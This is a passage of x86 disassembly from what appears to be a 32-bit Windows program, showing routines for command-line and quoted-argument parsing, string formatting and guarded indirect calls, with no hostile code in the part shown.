  4053e2:	jne    0x405488
  4053e8:	and    DWORD PTR ds:0x40b040,0x0
  4053ef:	lea    eax,[ebp-0x868]
  4053f5:	and    DWORD PTR [ebp-0x868],0x0
  4053fc:	mov    edx,0x401428
  405401:	push   eax
  405402:	push   ecx
  405403:	push   ecx
  405404:	call   0x402957
  405409:	add    esp,0xc
  40540c:	test   eax,eax
  40540e:	jne    0x405488
  405410:	lea    eax,[ebp-0x858]
  405416:	mov    DWORD PTR [ebp-0x860],0x28
  405420:	mov    DWORD PTR [ebp-0x864],eax
  405426:	lea    eax,[ebp-0x86c]
  40542c:	push   eax
  40542d:	lea    eax,[ebp-0x858]
  405433:	mov    DWORD PTR [ebp-0x86c],0x50
  40543d:	push   eax
  40543e:	push   0x0
  405440:	push   0x0
  405442:	push   0x401484
  405447:	push   DWORD PTR [ebp-0x868]
  40544d:	call   DWORD PTR ds:0x40e020
  405453:	test   eax,eax
  405455:	jne    0x405467
  405457:	mov    eax,DWORD PTR [ebp-0x864]
  40545d:	mov    eax,DWORD PTR [eax]
  40545f:	and    eax,0x3
  405462:	mov    ds:0x40b040,eax
  405467:	push   DWORD PTR [ebp-0x868]
  40546d:	call   DWORD PTR ds:0x40e06c
  405473:	cmp    DWORD PTR [ebp-0x860],0x28
  40547a:	jle    0x405488
  40547c:	push   DWORD PTR [ebp-0x864]
  405482:	call   DWORD PTR ds:0x40e104
  405488:	test   DWORD PTR ds:0x40b040,0x3
  405492:	je     0x4054f7
  405494:	xor    eax,eax
  405496:	push   0x800
  40549b:	push   eax
  40549c:	mov    WORD PTR [ebp-0x808],ax
  4054a3:	lea    eax,[ebp-0x806]
  4054a9:	push   eax
  4054aa:	call   0x409b76
  4054af:	add    esp,0xc
  4054b2:	lea    eax,[ebp-0x808]
  4054b8:	push   edi
  4054b9:	test   ebx,ebx
  4054bb:	je     0x4054d3
  4054bd:	push   ebx
  4054be:	push   0x401490
  4054c3:	push   0x401
  4054c8:	push   eax
  4054c9:	call   0x402820
  4054ce:	add    esp,0x14
  4054d1:	jmp    0x4054e6
  4054d3:	push   0x4014b4
  4054d8:	push   0x401
  4054dd:	push   eax
  4054de:	call   0x402820
  4054e3:	add    esp,0x10
  4054e6:	test   eax,eax
  4054e8:	js     0x4054f7
  4054ea:	lea    eax,[ebp-0x808]
  4054f0:	push   eax
  4054f1:	call   DWORD PTR ds:0x40e09c
  4054f7:	push   esi
  4054f8:	call   DWORD PTR ds:0x40e0f8
  4054fe:	mov    ecx,DWORD PTR [ebp-0x4]
  405501:	pop    edi
  405502:	pop    esi
  405503:	xor    ecx,ebp
  405505:	pop    ebx
  405506:	call   0x409090
  40550b:	mov    esp,ebp
  40550d:	pop    ebp
  40550e:	ret    
  40550f:	int3   
  405510:	int3   
  405511:	int3   
  405512:	int3   
  405513:	int3   
  405514:	mov    edi,edi
  405516:	push   ebp
  405517:	mov    ebp,esp
  405519:	push   ecx
  40551a:	push   ecx
  40551b:	mov    eax,ds:0x40b000
  405520:	xor    eax,ebp
  405522:	mov    DWORD PTR [ebp-0x4],eax
  405525:	and    DWORD PTR [ebp-0x8],0x0
  405529:	lea    eax,[ebp-0x8]
  40552c:	push   esi
  40552d:	push   eax
  40552e:	push   0x4012b0
  405533:	push   0x0
  405535:	call   DWORD PTR ds:0x40e090
  40553b:	test   eax,eax
  40553d:	je     0x405577
  40553f:	push   0x4014c0
  405544:	push   DWORD PTR [ebp-0x8]
  405547:	call   DWORD PTR ds:0x40e0fc
  40554d:	mov    esi,eax
  40554f:	test   esi,esi
  405551:	je     0x40556e
  405553:	mov    ecx,esi
  405555:	call   DWORD PTR ds:0x40e20c
  40555b:	call   esi
  40555d:	test   eax,eax
  40555f:	je     0x40556e
  405561:	push   DWORD PTR [ebp-0x8]
  405564:	call   DWORD PTR ds:0x40e084
  40556a:	xor    eax,eax
  40556c:	jmp    0x40557a
  40556e:	push   DWORD PTR [ebp-0x8]
  405571:	call   DWORD PTR ds:0x40e084
  405577:	xor    eax,eax
  405579:	inc    eax
  40557a:	mov    ecx,DWORD PTR [ebp-0x4]
  40557d:	xor    ecx,ebp
  40557f:	pop    esi
  405580:	call   0x409090
  405585:	mov    esp,ebp
  405587:	pop    ebp
  405588:	ret    
  405589:	int3   
  40558a:	int3   
  40558b:	int3   
  40558c:	int3   
  40558d:	int3   
  40558e:	mov    edi,edi
  405590:	push   ebp
  405591:	mov    ebp,esp
  405593:	sub    esp,0xc
  405596:	mov    eax,ds:0x40b000
  40559b:	xor    eax,ebp
  40559d:	mov    DWORD PTR [ebp-0x4],eax
  4055a0:	or     DWORD PTR [ebp-0x8],0xffffffff
  4055a4:	xor    eax,eax
  4055a6:	push   esi
  4055a7:	mov    esi,DWORD PTR ds:0x40b058
  4055ad:	mov    ecx,esi
  4055af:	push   eax
  4055b0:	push   eax
  4055b1:	push   eax
  4055b2:	push   eax
  4055b3:	lea    eax,[ebp-0xc]
  4055b6:	mov    DWORD PTR [ebp-0xc],0x4d2fa200
  4055bd:	push   eax
  4055be:	push   DWORD PTR ds:0x40cc10
  4055c4:	call   DWORD PTR ds:0x40e20c
  4055ca:	call   esi
  4055cc:	mov    ecx,DWORD PTR [ebp-0x4]
  4055cf:	xor    ecx,ebp
  4055d1:	pop    esi
  4055d2:	call   0x409090
  4055d7:	mov    esp,ebp
  4055d9:	pop    ebp
  4055da:	ret    
  4055db:	int3   
  4055dc:	int3   
  4055dd:	int3   
  4055de:	int3   
  4055df:	int3   
  4055e0:	mov    edi,edi
  4055e2:	push   ebp
  4055e3:	mov    ebp,esp
  4055e5:	sub    esp,0x94c
  4055eb:	mov    eax,ds:0x40b000
  4055f0:	xor    eax,ebp
  4055f2:	mov    DWORD PTR [ebp-0x4],eax
  4055f5:	push   ebx
  4055f6:	push   esi
  4055f7:	push   edi
  4055f8:	xor    eax,eax
  4055fa:	xor    ebx,ebx
  4055fc:	push   0x800
  405601:	mov    WORD PTR [ebp-0x820],ax
  405608:	mov    esi,ecx
  40560a:	lea    eax,[ebp-0x81e]
  405610:	push   ebx
  405611:	push   eax
  405612:	call   0x409b76
  405617:	add    esp,0xc
  40561a:	mov    DWORD PTR [ebp-0x948],ebx
  405620:	cmp    esi,0x641
  405626:	jb     0x405648
  405628:	push   ebx
  405629:	push   0x401
  40562e:	lea    eax,[ebp-0x820]
  405634:	push   eax
  405635:	push   esi
  405636:	push   0xffffffff
  405638:	call   DWORD PTR ds:0x40f038
  40563e:	mov    edi,eax
  405640:	test   edi,edi
  405642:	jne    0x40571b
  405648:	call   DWORD PTR ds:0x40e0e0
  40564e:	push   0x4014e0
  405653:	mov    edi,eax
  405655:	call   DWORD PTR ds:0x40e0bc
  40565b:	mov    ebx,eax
  40565d:	test   ebx,ebx
  40565f:	je     0x4056b1
  405661:	push   0x4014f4
  405666:	push   ebx
  405667:	call   DWORD PTR ds:0x40e0fc
  40566d:	mov    DWORD PTR [ebp-0x944],eax
  405673:	test   eax,eax
  405675:	je     0x4056aa
  405677:	mov    ecx,eax
  405679:	call   DWORD PTR ds:0x40e20c
  40567f:	call   DWORD PTR [ebp-0x944]
  405685:	push   0xa
  405687:	movzx  eax,ax
  40568a:	lea    ecx,[ebp-0x18]
  40568d:	push   ecx
  40568e:	mov    DWORD PTR [ebp-0x948],eax
  405694:	push   0x20001004
  405699:	movzx  eax,ax
  40569c:	push   eax
  40569d:	call   DWORD PTR ds:0x40e0c0
  4056a3:	test   eax,eax
  4056a5:	je     0x4056aa
  4056a7:	mov    edi,DWORD PTR [ebp-0x18]
  4056aa:	push   ebx
  4056ab:	call   DWORD PTR ds:0x40e084
  4056b1:	xor    ebx,ebx
  4056b3:	lea    eax,[ebp-0x820]
  4056b9:	push   ebx
  4056ba:	push   0x401
  4056bf:	push   eax
  4056c0:	mov    eax,DWORD PTR [ebp-0x948]
  4056c6:	movzx  eax,ax
  4056c9:	push   eax
  4056ca:	push   esi
  4056cb:	push   ebx
  4056cc:	push   0x1000
  4056d1:	call   DWORD PTR ds:0x40e0cc
  4056d7:	test   eax,eax
  4056d9:	je     0x4056f9
  4056db:	lea    eax,[eax*2-0x4]
  4056e2:	cmp    eax,0x802
  4056e7:	jae    0x40584a
  4056ed:	xor    ecx,ecx
  4056ef:	mov    WORD PTR [ebp+eax*1-0x820],cx
  4056f7:	jmp    0x40571b
  4056f9:	push   esi
  4056fa:	push   0x401510
  4056ff:	lea    eax,[ebp-0x820]
  405705:	push   0x401
  40570a:	push   eax
  40570b:	call   0x402820
  405710:	add    esp,0x10
  405713:	test   eax,eax
  405715:	js     0x405839
  40571b:	cmp    DWORD PTR ds:0x40c4c0,0x0
  405722:	mov    eax,ds:0x40c430
  405727:	jne    0x4057ea
  40572d:	test   eax,eax
  40572f:	je     0x40573a
  405731:	cmp    eax,0xffffffff
  405734:	jne    0x4057ea
  40573a:	lea    eax,[ebp-0x8]
  40573d:	mov    DWORD PTR [ebp-0x10],0x1
  405744:	mov    esi,0x11c
  405749:	mov    DWORD PTR [ebp-0x14],eax
  40574c:	push   esi
  40574d:	lea    eax,[ebp-0x940]
  405753:	push   ebx
  405754:	push   eax
  405755:	call   0x409b76
  40575a:	add    esp,0xc
  40575d:	mov    DWORD PTR [ebp-0x940],esi
  405763:	lea    eax,[ebp-0x940]
  405769:	push   eax
  40576a:	call   DWORD PTR ds:0x40e0d0
  405770:	test   eax,eax
  405772:	je     0x4057cd
  405774:	cmp    DWORD PTR [ebp-0x93c],0x6
  40577b:	jb     0x4057cd
  40577d:	push   ecx
  40577e:	push   0x100
  405783:	lea    ecx,[ebp-0x14]
  405786:	call   0x407f90
  40578b:	test   al,al
  40578d:	je     0x4057cd
  40578f:	push   ebx
  405790:	push   DWORD PTR [ebp-0x10]
  405793:	push   DWORD PTR [ebp-0x14]
  405796:	push   0x1c
  405798:	push   0xffffffff
  40579a:	call   DWORD PTR ds:0x40f038
  4057a0:	test   eax,eax
  4057a2:	je     0x4057cd
  4057a4:	mov    esi,DWORD PTR ds:0x40b064
  4057aa:	lea    eax,[ebp-0x820]
  4057b0:	push   ebx
  4057b1:	push   0xfffe
  4057b6:	push   0x1
  4057b8:	push   ebx
  4057b9:	push   eax
  4057ba:	push   DWORD PTR [ebp-0x14]
  4057bd:	mov    ecx,esi
  4057bf:	push   ebx
  4057c0:	push   ebx
  4057c1:	call   DWORD PTR ds:0x40e20c
  4057c7:	call   esi
  4057c9:	test   eax,eax
  4057cb:	jns    0x4057e0
  4057cd:	push   ebx
  4057ce:	push   edi
  4057cf:	push   0x10
  4057d1:	push   ebx
  4057d2:	lea    eax,[ebp-0x820]
  4057d8:	push   eax
  4057d9:	push   ebx
  4057da:	call   DWORD PTR ds:0x40f030
  4057e0:	lea    ecx,[ebp-0x14]
  4057e3:	call   0x407f6a
  4057e8:	jmp    0x405839
  4057ea:	test   eax,eax
  4057ec:	je     0x405839
  4057ee:	cmp    eax,0xffffffff
  4057f1:	je     0x405839
  4057f3:	lea    eax,[ebp-0x820]
  4057f9:	push   eax
  4057fa:	call   DWORD PTR ds:0x40e0ec
  405800:	push   ebx
  405801:	lea    ecx,[ebp-0x944]
  405807:	add    eax,eax
  405809:	push   ecx
  40580a:	push   eax
  40580b:	lea    eax,[ebp-0x820]
  405811:	push   eax
  405812:	push   DWORD PTR ds:0x40c430
  405818:	call   DWORD PTR ds:0x40e0a8
  40581e:	push   ebx
  40581f:	lea    eax,[ebp-0x944]
  405825:	push   eax
  405826:	push   0x4
  405828:	push   0x4020cc
  40582d:	push   DWORD PTR ds:0x40c430
  405833:	call   DWORD PTR ds:0x40e0a8
  405839:	mov    ecx,DWORD PTR [ebp-0x4]
  40583c:	pop    edi
  40583d:	pop    esi
  40583e:	xor    ecx,ebp
  405840:	pop    ebx
  405841:	call   0x409090
  405846:	mov    esp,ebp
  405848:	pop    ebp
  405849:	ret    
  40584a:	call   0x4092a3
  40584f:	int3   
  405850:	int3   
  405851:	int3   
  405852:	int3   
  405853:	int3   
  405854:	int3   
  405855:	mov    edi,edi
  405857:	mov    edx,DWORD PTR [ecx]
  405859:	movzx  eax,WORD PTR [edx]
  40585c:	cmp    eax,0x20
  40585f:	je     0x405866
  405861:	cmp    eax,0x9
  405864:	jne    0x40586d
  405866:	lea    eax,[edx+0x2]
  405869:	mov    DWORD PTR [ecx],eax
  40586b:	jmp    0x405857
  40586d:	ret    
  40586e:	int3   
  40586f:	int3   
  405870:	int3   
  405871:	int3   
  405872:	int3   
  405873:	mov    edi,edi
  405875:	push   ebp
  405876:	mov    ebp,esp
  405878:	push   ebx
  405879:	mov    ebx,edx
  40587b:	mov    edx,DWORD PTR [ecx]
  40587d:	push   edi
  40587e:	movzx  eax,WORD PTR [edx]
  405881:	jmp    0x405897
  405883:	cmp    ax,0x20
  405887:	je     0x40589c
  405889:	cmp    ax,0x9
  40588d:	je     0x40589c
  40588f:	add    DWORD PTR [ecx],0x2
  405892:	mov    eax,DWORD PTR [ecx]
  405894:	movzx  eax,WORD PTR [eax]
  405897:	test   ax,ax
  40589a:	jne    0x405883
  40589c:	mov    edi,DWORD PTR [ecx]
  40589e:	sub    edi,edx
  4058a0:	sar    edi,1
  4058a2:	cmp    edi,DWORD PTR [ebp+0x8]
  4058a5:	jae    0x4058ce
  4058a7:	test   edi,edi
  4058a9:	js     0x4058ce
  4058ab:	je     0x4058c3
  4058ad:	push   esi
  4058ae:	mov    esi,DWORD PTR [ebx]
  4058b0:	add    edi,edi
  4058b2:	push   edi
  4058b3:	push   edx
  4058b4:	push   esi
  4058b5:	call   0x409b6a
  4058ba:	add    esp,0xc
  4058bd:	lea    eax,[esi+edi*1]
  4058c0:	mov    DWORD PTR [ebx],eax
  4058c2:	pop    esi
  4058c3:	mov    eax,DWORD PTR [ebx]
  4058c5:	xor    ecx,ecx
  4058c7:	mov    WORD PTR [eax],cx
  4058ca:	mov    al,0x1
  4058cc:	jmp    0x4058d0
  4058ce:	xor    al,al
  4058d0:	pop    edi
  4058d1:	pop    ebx
  4058d2:	pop    ebp
  4058d3:	ret    
  4058d4:	int3   
  4058d5:	int3   
  4058d6:	int3   
  4058d7:	int3   
  4058d8:	int3   
  4058d9:	mov    edi,edi
  4058db:	push   ebp
  4058dc:	mov    ebp,esp
  4058de:	sub    esp,0x14
  4058e1:	push   ebx
  4058e2:	push   esi
  4058e3:	mov    esi,edx
  4058e5:	xor    eax,eax
  4058e7:	mov    edx,ecx
  4058e9:	mov    DWORD PTR [ebp-0x8],esi
  4058ec:	push   edi
  4058ed:	mov    DWORD PTR [ebp-0xc],edx
  4058f0:	mov    ecx,DWORD PTR [edx]
  4058f2:	cmp    ax,WORD PTR [ecx]
  4058f5:	je     0x4058fa
  4058f7:	add    ecx,0x2
  4058fa:	movzx  eax,WORD PTR [ecx]
  4058fd:	push   0x22
  4058ff:	pop    ebx
  405900:	mov    DWORD PTR [edx],ecx
  405902:	cmp    ax,bx
  405905:	je     0x405a4f
  40590b:	mov    edi,DWORD PTR [ebp+0x8]
  40590e:	mov    DWORD PTR [ebp-0x14],0x60
  405915:	mov    DWORD PTR [ebp-0x4],edi
  405918:	mov    ebx,DWORD PTR [edx]
  40591a:	cmp    WORD PTR [ebx],0x0
  40591e:	je     0x405a08
  405924:	cmp    ax,0x5c
  405928:	jne    0x405991
  40592a:	push   0x60
  40592c:	lea    eax,[ebx+0x2]
  40592f:	pop    esi
  405930:	cmp    WORD PTR [eax],si
  405933:	mov    esi,DWORD PTR [ebp-0x8]
  405936:	mov    DWORD PTR [ebp-0x10],eax
  405939:	jne    0x4059eb
  40593f:	sub    ebx,ecx
  405941:	sar    ebx,1
  405943:	cmp    ebx,edi
  405945:	jae    0x405a54
  40594b:	test   ebx,ebx
  40594d:	js     0x405a54
  405953:	je     0x405973
  405955:	mov    esi,DWORD PTR [esi]
  405957:	lea    edi,[ebx+ebx*1]
  40595a:	push   edi
  40595b:	push   ecx
  40595c:	push   esi
  40595d:	call   0x409b6a
  405962:	mov    edx,DWORD PTR [ebp-0xc]
  405965:	lea    eax,[esi+edi*1]
  405968:	mov    esi,DWORD PTR [ebp-0x8]
  40596b:	add    esp,0xc
  40596e:	mov    edi,DWORD PTR [ebp-0x4]
  405971:	mov    DWORD PTR [esi],eax
  405973:	mov    eax,DWORD PTR [esi]
  405975:	push   0x60
  405977:	pop    ecx
  405978:	mov    WORD PTR [eax],cx
  40597b:	add    eax,0x2
  40597e:	mov    ecx,DWORD PTR [ebp-0x10]
  405981:	mov    DWORD PTR [esi],eax
  405983:	or     eax,0xffffffff
  405986:	sub    eax,ebx
  405988:	mov    DWORD PTR [edx],ecx
  40598a:	add    edi,eax
  40598c:	add    ecx,0x2
  40598f:	jmp    0x4059e8
  405991:	cmp    ax,WORD PTR [ebp-0x14]
  405995:	jne    0x4059eb
  405997:	mov    eax,ebx
  405999:	sub    eax,ecx
  40599b:	sar    eax,1
  40599d:	mov    DWORD PTR [ebp-0x10],eax
  4059a0:	cmp    eax,edi
  4059a2:	jae    0x405a54
  4059a8:	test   eax,eax
  4059aa:	js     0x405a54
  4059b0:	je     0x4059d0
  4059b2:	mov    esi,DWORD PTR [esi]
  4059b4:	lea    edi,[eax+eax*1]
  4059b7:	push   edi
  4059b8:	push   ecx
  4059b9:	push   esi
  4059ba:	call   0x409b6a
  4059bf:	mov    edx,DWORD PTR [ebp-0xc]
  4059c2:	lea    eax,[esi+edi*1]
  4059c5:	mov    esi,DWORD PTR [ebp-0x8]
  4059c8:	add    esp,0xc
  4059cb:	mov    edi,DWORD PTR [ebp-0x4]
  4059ce:	mov    DWORD PTR [esi],eax
  4059d0:	mov    eax,DWORD PTR [esi]
  4059d2:	push   0x22
  4059d4:	pop    ecx
  4059d5:	mov    WORD PTR [eax],cx
  4059d8:	add    eax,0x2
  4059db:	mov    DWORD PTR [esi],eax
  4059dd:	lea    ecx,[ebx+0x2]
  4059e0:	or     eax,0xffffffff
  4059e3:	sub    eax,DWORD PTR [ebp-0x10]
  4059e6:	add    edi,eax
  4059e8:	mov    DWORD PTR [ebp-0x4],edi
  4059eb:	mov    eax,DWORD PTR [edx]
  4059ed:	xor    ebx,ebx
  4059ef:	cmp    bx,WORD PTR [eax]
  4059f2:	je     0x4059f7
  4059f4:	add    eax,0x2
  4059f7:	push   0x22
  4059f9:	mov    DWORD PTR [edx],eax
  4059fb:	movzx  eax,WORD PTR [eax]
  4059fe:	pop    ebx
  4059ff:	cmp    ax,bx
  405a02:	jne    0x405918
  405a08:	mov    eax,DWORD PTR [ebp-0x4]
  405a0b:	mov    ebx,DWORD PTR [edx]
  405a0d:	mov    edi,ebx
  405a0f:	sub    edi,ecx
  405a11:	sar    edi,1
  405a13:	cmp    edi,eax
  405a15:	jae    0x405a54
  405a17:	test   edi,edi
  405a19:	js     0x405a54
  405a1b:	je     0x405a37
  405a1d:	mov    esi,DWORD PTR [esi]
  405a1f:	add    edi,edi
  405a21:	push   edi
  405a22:	push   ecx
  405a23:	push   esi
  405a24:	call   0x409b6a
  405a29:	mov    edx,DWORD PTR [ebp-0xc]
  405a2c:	lea    eax,[esi+edi*1]
  405a2f:	mov    esi,DWORD PTR [ebp-0x8]
  405a32:	add    esp,0xc
  405a35:	mov    DWORD PTR [esi],eax
  405a37:	mov    eax,DWORD PTR [esi]
  405a39:	xor    ecx,ecx
  405a3b:	push   0x22
  405a3d:	mov    WORD PTR [eax],cx
  405a40:	pop    eax
  405a41:	cmp    WORD PTR [ebx],ax
  405a44:	jne    0x405a4b
  405a46:	lea    eax,[ebx+0x2]
  405a49:	mov    DWORD PTR [edx],eax
  405a4b:	mov    al,0x1
  405a4d:	jmp    0x405a56
  405a4f:	mov    eax,DWORD PTR [ebp+0x8]
  405a52:	jmp    0x405a0b
  405a54:	xor    al,al
  405a56:	pop    edi
  405a57:	pop    esi
  405a58:	pop    ebx
  405a59:	mov    esp,ebp
  405a5b:	pop    ebp
  405a5c:	ret    
  405a5d:	int3   
  405a5e:	int3   
  405a5f:	int3   
  405a60:	int3   
  405a61:	int3   
  405a62:	mov    edi,edi
  405a64:	push   ebp
  405a65:	mov    ebp,esp
  405a67:	mov    eax,DWORD PTR [ecx]
  405a69:	movzx  eax,WORD PTR [eax]
  405a6c:	cmp    eax,0x22
  405a6f:	jne    0x405a77
  405a71:	pop    ebp
  405a72:	jmp    0x4058d9
  405a77:	cmp    eax,0x2f
  405a7a:	je     0x405a87
  405a7c:	cmp    eax,0x2d
  405a7f:	je     0x405a87
  405a81:	pop    ebp
  405a82:	jmp    0x405873
  405a87:	cmp    DWORD PTR [ebp+0x8],0x0
  405a8b:	ja     0x405a91
  405a8d:	xor    al,al
  405a8f:	pop    ebp
  405a90:	ret    
  405a91:	mov    eax,DWORD PTR [edx]
  405a93:	xor    ecx,ecx
  405a95:	mov    WORD PTR [eax],cx
  405a98:	mov    al,0x1
  405a9a:	pop    ebp
  405a9b:	ret    
  405a9c:	int3   
  405a9d:	int3   
  405a9e:	int3   
  405a9f:	int3   
  405aa0:	int3   
  405aa1:	mov    edi,edi
  405aa3:	push   ebp
  405aa4:	mov    ebp,esp
  405aa6:	sub    esp,0xc
  405aa9:	push   ebx
  405aaa:	mov    ebx,ecx
  405aac:	push   esi
  405aad:	push   edi
  405aae:	mov    edi,edx
  405ab0:	mov    DWORD PTR [ebp-0x8],ebx
  405ab3:	mov    esi,DWORD PTR [ebx]
  405ab5:	movzx  eax,WORD PTR [esi]
  405ab8:	cmp    eax,0x25
  405abb:	je     0x405acf
  405abd:	push   eax
  405abe:	call   DWORD PTR ds:0x40e170
  405ac4:	test   eax,eax
  405ac6:	jne    0x405acf
  405ac8:	xor    eax,eax
  405aca:	jmp    0x405bfc
  405acf:	movzx  eax,WORD PTR [esi]
  405ad2:	mov    DWORD PTR [ebp-0x4],0x2
  405ad9:	push   0x20
  405adb:	pop    ecx
  405adc:	push   0x3d
  405ade:	pop    edx
  405adf:	test   ax,ax
  405ae2:	je     0x405afe
  405ae4:	mov    ebx,DWORD PTR [ebp-0x4]
  405ae7:	cmp    cx,ax
  405aea:	je     0x405afb
  405aec:	cmp    dx,ax
  405aef:	je     0x405afb
  405af1:	add    esi,ebx
  405af3:	movzx  eax,WORD PTR [esi]
  405af6:	test   ax,ax
  405af9:	jne    0x405ae7
  405afb:	mov    ebx,DWORD PTR [ebp-0x8]
  405afe:	cmp    dx,WORD PTR [esi]
  405b01:	jne    0x405ac8
  405b03:	add    esi,0x2
  405b06:	xor    edx,edx
  405b08:	push   0x22
  405b0a:	pop    eax
  405b0b:	cmp    ax,WORD PTR [esi]
  405b0e:	jne    0x405b16
  405b10:	inc    edx
  405b11:	mov    ecx,eax
  405b13:	add    esi,0x2
  405b16:	movzx  eax,WORD PTR [esi]
  405b19:	test   ax,ax
  405b1c:	je     0x405b66
  405b1e:	cmp    cx,ax
  405b21:	jne    0x405b3d
  405b23:	test   edx,edx
  405b25:	je     0x405b55
  405b27:	and    DWORD PTR [ebp-0xc],0x0
  405b2b:	cmp    WORD PTR [ebp-0xc],ax
  405b2f:	mov    eax,esi
  405b31:	je     0x405b36
  405b33:	lea    eax,[esi+0x2]
  405b36:	cmp    cx,WORD PTR [eax]
  405b39:	jne    0x405b55
  405b3b:	mov    esi,eax
  405b3d:	movzx  eax,WORD PTR [esi]
  405b40:	and    DWORD PTR [ebp-0xc],0x0
  405b44:	cmp    WORD PTR [ebp-0xc],ax
  405b48:	je     0x405b66
  405b4a:	add    esi,DWORD PTR [ebp-0x4]
  405b4d:	movzx  eax,WORD PTR [esi]
  405b50:	test   ax,ax
  405b53:	jne    0x405b1e
  405b55:	movzx  eax,WORD PTR [esi]
  405b58:	test   ax,ax
  405b5b:	je     0x405b66
  405b5d:	cmp    cx,ax
  405b60:	jne    0x405ac8
  405b66:	test   edx,edx
  405b68:	je     0x405b74
  405b6a:	xor    ecx,ecx
  405b6c:	cmp    cx,ax
  405b6f:	je     0x405b74
  405b71:	add    esi,DWORD PTR [ebp-0x4]
  405b74:	mov    eax,esi
  405b76:	sub    eax,DWORD PTR [ebx]
  405b78:	sar    eax,1
  405b7a:	lea    ebx,[eax+0x1]
  405b7d:	cmp    ebx,0x7fffffff
  405b83:	jbe    0x405b96
  405b85:	xor    edx,edx
  405b87:	mov    ecx,0x401534
  405b8c:	call   0x4053b7
  405b91:	jmp    0x405ac8
  405b96:	mov    eax,DWORD PTR [edi+0x4]
  405b99:	cmp    eax,ebx
  405b9b:	jge    0x405bdd
  405b9d:	cmp    eax,DWORD PTR [edi+0x8]
  405ba0:	jle    0x405baf
  405ba2:	cmp    DWORD PTR [edi],0x0
  405ba5:	je     0x405baf
  405ba7:	push   DWORD PTR [edi]
  405ba9:	call   DWORD PTR ds:0x40e104
  405baf:	mov    DWORD PTR [edi+0x4],ebx
  405bb2:	cmp    ebx,DWORD PTR [edi+0x8]
  405bb5:	jle    0x405bd0
  405bb7:	xor    ecx,ecx
  405bb9:	mov    eax,ebx
  405bbb:	mul    DWORD PTR [ebp-0x4]
  405bbe:	seto   cl
  405bc1:	neg    ecx
  405bc3:	or     ecx,eax
  405bc5:	push   ecx
  405bc6:	push   0x0
  405bc8:	call   DWORD PTR ds:0x40e0b4
  405bce:	jmp    0x405bd3
  405bd0:	lea    eax,[edi+0xc]
  405bd3:	mov    DWORD PTR [edi],eax
  405bd5:	test   eax,eax
  405bd7:	je     0x405ac8
  405bdd:	mov    edx,DWORD PTR [edi+0x4]
  405be0:	mov    ecx,DWORD PTR [edi]
  405be2:	push   ebx
  405be3:	mov    ebx,DWORD PTR [ebp-0x8]
  405be6:	push   DWORD PTR [ebx]
  405be8:	call   0x402713
  405bed:	xor    ecx,ecx
  405bef:	cmp    cx,WORD PTR [esi]
  405bf2:	je     0x405bf7
  405bf4:	add    esi,DWORD PTR [ebp-0x4]
  405bf7:	xor    eax,eax
  405bf9:	mov    DWORD PTR [ebx],esi
  405bfb:	inc    eax
  405bfc:	pop    edi
  405bfd:	pop    esi
  405bfe:	pop    ebx
  405bff:	mov    esp,ebp
  405c01:	pop    ebp
  405c02:	ret    
  405c03:	int3   
  405c04:	int3   
  405c05:	int3   
  405c06:	int3   
  405c07:	int3   
  405c08:	mov    edi,edi
  405c0a:	push   ebp
  405c0b:	mov    ebp,esp
  405c0d:	sub    esp,0xd4
  405c13:	mov    eax,ds:0x40b000
  405c18:	xor    eax,ebp
  405c1a:	mov    DWORD PTR [ebp-0x4],eax
  405c1d:	push   ebx
  405c1e:	push   esi
  405c1f:	mov    esi,DWORD PTR ds:0x40b04c
  405c25:	lea    eax,[ebp-0xd4]
  405c2b:	push   eax
  405c2c:	push   0x401fec
  405c31:	push   0x4
  405c33:	push   0x0
  405c35:	mov    ebx,0x401ffc
  405c3a:	mov    ecx,esi
  405c3c:	push   ebx
  405c3d:	call   DWORD PTR ds:0x40e20c
  405c43:	call   esi
  405c45:	mov    esi,eax
  405c47:	test   esi,esi
  405c49:	je     0x405c92
  405c4b:	xor    eax,eax
  405c4d:	push   0xc6
  405c52:	push   eax
  405c53:	mov    WORD PTR [ebp-0xcc],ax
  405c5a:	lea    eax,[ebp-0xca]
  405c60:	push   eax
  405c61:	call   0x409b76
  405c66:	push   esi
  405c67:	push   0x401570
  405c6c:	lea    eax,[ebp-0xcc]
  405c72:	push   0x64
  405c74:	push   eax
  405c75:	call   0x402820
  405c7a:	add    esp,0x1c
  405c7d:	test   eax,eax
  405c7f:	js     0x405c8e
  405c81:	xor    edx,edx
  405c83:	lea    ecx,[ebp-0xcc]
  405c89:	call   0x4053b7
  405c8e:	xor    eax,eax
  405c90:	jmp    0x405cd0
  405c92:	mov    eax,DWORD PTR [ebp-0xd4]
  405c98:	lea    ecx,[ebp-0xd0]
  405c9e:	and    DWORD PTR [ebp-0xd0],0x0
  405ca5:	push   ecx
  405ca6:	push   ebx
  405ca7:	mov    esi,DWORD PTR [eax]
  405ca9:	push   eax
  405caa:	mov    ecx,DWORD PTR [esi]
  405cac:	call   DWORD PTR ds:0x40e20c
  405cb2:	call   DWORD PTR [esi]
  405cb4:	mov    eax,DWORD PTR [ebp-0xd4]
  405cba:	push   eax
  405cbb:	mov    ecx,DWORD PTR [eax]
  405cbd:	mov    esi,DWORD PTR [ecx+0x8]
  405cc0:	mov    ecx,esi
  405cc2:	call   DWORD PTR ds:0x40e20c
  405cc8:	call   esi
  405cca:	mov    eax,DWORD PTR [ebp-0xd0]
  405cd0:	mov    ecx,DWORD PTR [ebp-0x4]
  405cd3:	pop    esi
  405cd4:	xor    ecx,ebp
  405cd6:	pop    ebx
  405cd7:	call   0x409090
  405cdc:	mov    esp,ebp
  405cde:	pop    ebp
  405cdf:	ret    
  405ce0:	int3   
  405ce1:	int3   
  405ce2:	int3   
  405ce3:	int3   
  405ce4:	int3   
  405ce5:	mov    eax,DWORD PTR [ecx]
  405ce7:	test   eax,eax
  405ce9:	jne    0x405cee
  405ceb:	xor    eax,eax
  405ced:	ret    
  405cee:	cmp    DWORD PTR [eax],0x80000003
  405cf4:	je     0x405ceb
  405cf6:	cmp    DWORD PTR ds:0x40cc24,0x0
  405cfd:	je     0x405d03
  405cff:	xor    eax,eax
  405d01:	inc    eax
  405d02:	ret    
  405d03:	push   ecx
  405d04:	call   DWORD PTR ds:0x40e108
  405d0a:	ret    
  405d0b:	int3   
  405d0c:	int3   
  405d0d:	int3   
  405d0e:	int3   
  405d0f:	int3   
  405d10:	mov    edi,edi
  405d12:	push   ebp
  405d13:	mov    ebp,esp
  405d15:	push   ecx
  405d16:	mov    eax,ds:0x40b000
  405d1b:	xor    eax,ebp
  405d1d:	mov    DWORD PTR [ebp-0x4],eax
  405d20:	call   DWORD PTR ds:0x40e124
  405d26:	test   eax,eax
  405d28:	js     0x405d68
  405d2a:	and    eax,0xff
